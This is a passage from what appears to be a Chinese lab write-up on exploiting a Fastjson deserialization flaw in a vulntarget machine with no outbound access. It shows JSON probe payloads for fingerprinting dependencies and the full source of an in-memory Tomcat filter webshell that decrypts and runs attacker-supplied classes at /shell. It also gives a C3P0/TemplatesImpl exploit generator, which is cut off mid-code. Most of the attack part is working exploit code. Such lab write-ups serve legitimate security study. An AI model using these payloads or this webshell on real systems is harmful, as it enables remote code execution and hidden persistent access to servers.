8.0以下，org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br><span class="line">common-dbcp，org.apache.commons.dbcp.BasicDataSource</span><br></pre></td></tr></table></figure>

<p>但是这个应该是没tomcat打不了bcel</p>
<p><img src="/../imgs/vulntarget-m44.png"></p>
<p>然后common-io链靶机应该也没有那么多依赖（估计实战中才会遇到这种，坑很多），所以就只能打c3p0链了，因此下一步探测存在的依赖，利用Character转换报错可以判断存在何种依赖</p>
<blockquote>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12492#toc-3">https://xz.aliyun.com/t/12492#toc-3</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/950">https://www.sec-in.com/article/950</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/">https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/</a></p>
</blockquote>
<p><strong>依赖检测项目</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.bind.annotation.RequestMapping  <span class="comment">//SpringBoot</span></span><br><span class="line">org.apache.catalina.startup.Tomcat  <span class="comment">//Tomcat</span></span><br><span class="line">groovy.lang.GroovyShell  <span class="comment">//Groovy - 1.2.80</span></span><br><span class="line">com.mchange.v2.c3p0.DataSources  <span class="comment">//C3P0</span></span><br><span class="line">com.mysql.jdbc.Buffer  <span class="comment">//mysql-jdbc-5</span></span><br><span class="line">com.mysql.cj.api.authentication.AuthenticationProvider  <span class="comment">//mysql-connect-6</span></span><br><span class="line">com.mysql.cj.protocol.AuthenticationProvider <span class="comment">//mysql-connect-8</span></span><br><span class="line">sun.nio.cs.GBK  <span class="comment">//JDK8</span></span><br><span class="line">java.net.http.HttpClient  <span class="comment">//JDK11</span></span><br><span class="line">org.apache.ibatis.type.Alias  <span class="comment">//Mybatis</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp.BasicDataSource  <span class="comment">//tomcat-dbcp-7-BCEL</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource <span class="comment">//tomcat-dbcp-8及以后-BCEL</span></span><br><span class="line">org.apache.commons.io.Charsets       <span class="comment">// 存在commons-io,但不确定版本</span></span><br><span class="line">org.apache.commons.io.file.Counters  <span class="comment">//commons-io-2.7-2.8</span></span><br><span class="line">org.aspectj.ajde.Ajde  <span class="comment">//aspectjtools</span></span><br></pre></td></tr></table></figure>

<p><code>RequestMapping</code>本身为SpringBoot下的类，当存在该类时会报出类型转换错误，说明为SpringBoot项目</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Character&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m45.png"></p>
<p>通过这种方法可以验证出存在c3p0依赖</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Character&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.DataSources&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/vulntarget-m46.png"></p>
<p>由于目标不出网，因此需要利用<code>TemplatesImpl</code>来加载恶意字节码。为使该恶意类能够被加载，需从<code>AbstractTranslet</code>类继承，并重写他的两个方法，最后将该类编译为<code>.class</code>文件</p>
<blockquote>
<p>fastjson不出网回显利用：<a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">package sec;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line">import javax.servlet.DispatcherType;</span><br><span class="line">import javax.servlet.Filter;</span><br><span class="line">import javax.servlet.FilterChain;</span><br><span class="line">import javax.servlet.FilterConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import javax.servlet.http.HttpSession;</span><br><span class="line">import org.apache.catalina.Context;</span><br><span class="line">import org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line">import org.apache.catalina.core.StandardContext;</span><br><span class="line">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line">import sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line">public class IceShell extends AbstractTranslet implements Filter <span class="punctuation">&#123;</span></span><br><span class="line">    private final String pa = <span class="string">&quot;3ad2fddfe8bad8e6&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public IceShell() <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest servletRequest<span class="punctuation">,</span> ServletResponse servletResponse<span class="punctuation">,</span> FilterChain filterChain) throws IOException<span class="punctuation">,</span> ServletException <span class="punctuation">&#123;</span></span><br><span class="line">        HttpServletRequest request = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse)servletResponse;</span><br><span class="line">        HttpSession session = request.getSession();</span><br><span class="line">        Map&lt;String<span class="punctuation">,</span> Object&gt; pageContext = new HashMap();</span><br><span class="line">        pageContext.put(<span class="string">&quot;session&quot;</span><span class="punctuation">,</span> session);</span><br><span class="line">        pageContext.put(<span class="string">&quot;request&quot;</span><span class="punctuation">,</span> request);</span><br><span class="line">        pageContext.put(<span class="string">&quot;response&quot;</span><span class="punctuation">,</span> response);</span><br><span class="line">        ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        if (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">            Class Lclass;</span><br><span class="line">            if (cl.getClass().getSuperclass().getName().equals(<span class="string">&quot;java.lang.ClassLoader&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span> else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(<span class="string">&quot;java.lang.ClassLoader&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span> else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(<span class="string">&quot;java.lang.ClassLoader&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span> else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(<span class="string">&quot;java.lang.ClassLoader&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span> else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(<span class="string">&quot;java.lang.ClassLoader&quot;</span>)) <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span></span><br><span class="line">                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();</span><br><span class="line">                this.RushThere(Lclass<span class="punctuation">,</span> cl<span class="punctuation">,</span> session<span class="punctuation">,</span> request<span class="punctuation">,</span> pageContext);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">            filterChain.doFilter(servletRequest<span class="punctuation">,</span> servletResponse);</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void destroy() <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void RushThere(Class Lclass<span class="punctuation">,</span> ClassLoader cl<span class="punctuation">,</span> HttpSession session<span class="punctuation">,</span> HttpServletRequest request<span class="punctuation">,</span> Map&lt;String<span class="punctuation">,</span> Object&gt; pageContext) <span class="punctuation">&#123;</span></span><br><span class="line">        byte<span class="punctuation">[</span><span class="punctuation">]</span> bytecode = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        try <span class="punctuation">&#123;</span></span><br><span class="line">            Method define = Lclass.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span><span class="punctuation">,</span> byte<span class="punctuation">[</span><span class="punctuation">]</span>.class<span class="punctuation">,</span> Integer.TYPE<span class="punctuation">,</span> Integer.TYPE);</span><br><span class="line">            define.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">            Class uclass = <span class="literal"><span class="keyword">null</span></span>;</span><br><span class="line"></span><br><span class="line">            try <span class="punctuation">&#123;</span></span><br><span class="line">                uclass = cl.loadClass(<span class="string">&quot;U&quot;</span>);</span><br><span class="line">            <span class="punctuation">&#125;</span> catch (ClassNotFoundException var18) <span class="punctuation">&#123;</span></span><br><span class="line">                uclass = (Class)define.invoke(cl<span class="punctuation">,</span> bytecode<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> bytecode.length);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">            Object u = constructor.newInstance(this.getClass().getClassLoader());</span><br><span class="line">            Method Um = uclass.getDeclaredMethod(<span class="string">&quot;g&quot;</span><span class="punctuation">,</span> byte<span class="punctuation">[</span><span class="punctuation">]</span>.class);</span><br><span class="line">            Um.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">            String k = <span class="string">&quot;3ad2fddfe8bad8e6&quot;</span>;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;u&quot;</span><span class="punctuation">,</span> k);</span><br><span class="line">            Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(<span class="number">2</span><span class="punctuation">,</span> new SecretKeySpec(k.getBytes()<span class="punctuation">,</span> <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            byte<span class="punctuation">[</span><span class="punctuation">]</span> eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));</span><br><span class="line">            Class eclass = (Class)Um.invoke(u<span class="punctuation">,</span> eClassBytes);</span><br><span class="line">            Object a = eclass.newInstance();</span><br><span class="line">            Method b = eclass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span><span class="punctuation">,</span> Object.class);</span><br><span class="line">            b.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">            b.invoke(a<span class="punctuation">,</span> pageContext);</span><br><span class="line">        <span class="punctuation">&#125;</span> catch (Exception var19) <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void transform(DOM document<span class="punctuation">,</span> SerializationHandler<span class="punctuation">[</span><span class="punctuation">]</span> handlers) throws TransletException <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public void transform(DOM document<span class="punctuation">,</span> DTMAxisIterator iterator<span class="punctuation">,</span> SerializationHandler handler) throws TransletException <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    static <span class="punctuation">&#123;</span></span><br><span class="line">        try <span class="punctuation">&#123;</span></span><br><span class="line">            String name = <span class="string">&quot;AutomneGreet&quot;</span>;</span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            Field Configs = Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            Configs.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">            Map filterConfigs = (Map)Configs.get(standardContext);</span><br><span class="line">            if (filterConfigs.get(<span class="string">&quot;AutomneGreet&quot;</span>) == <span class="literal"><span class="keyword">null</span></span>) <span class="punctuation">&#123;</span></span><br><span class="line">                Filter filter = new IceShell();</span><br><span class="line">                FilterDef filterDef = new FilterDef();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;AutomneGreet&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                FilterMap filterMap = new FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;AutomneGreet&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class<span class="punctuation">,</span> FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext<span class="punctuation">,</span> filterDef);</span><br><span class="line">                filterConfigs.put(<span class="string">&quot;AutomneGreet&quot;</span><span class="punctuation">,</span> filterConfig);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span> catch (Exception var10) <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>最终exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex2</span> <span class="operator">=</span> bytesToHex(tobyteArray(gen()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">FJ1247</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + hex2 + <span class="string">&quot;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(FJ1247);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//FastJson原生反序列化加载恶意类字节码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">gen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CodeAudit\\project\\fastjson\\target\\classes\\sec\\IceShell.class&quot;</span>)); <span class="comment">// 读取其中字节即可</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> 